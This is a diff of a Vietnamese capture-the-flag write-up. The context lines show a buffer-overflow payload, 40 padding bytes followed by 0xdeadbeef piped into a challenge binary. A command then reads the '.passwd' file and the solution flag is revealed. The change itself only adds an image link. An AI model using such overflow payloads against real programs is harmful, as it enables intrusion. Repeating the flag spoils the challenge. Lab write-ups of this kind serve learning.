@@ -70,4 +70,5 @@ thêm code vào phần trên
 ``` cat <(python -c 'print 40*"a" + "\xef\xbe\xad\xde"') - | ./ch13 ```
 sau đó nhập 
 ``` cat ./.passwd ```
+![anh](image/13.png)
 ta đã có flag là : **1w4ntm0r3pr0np1s**
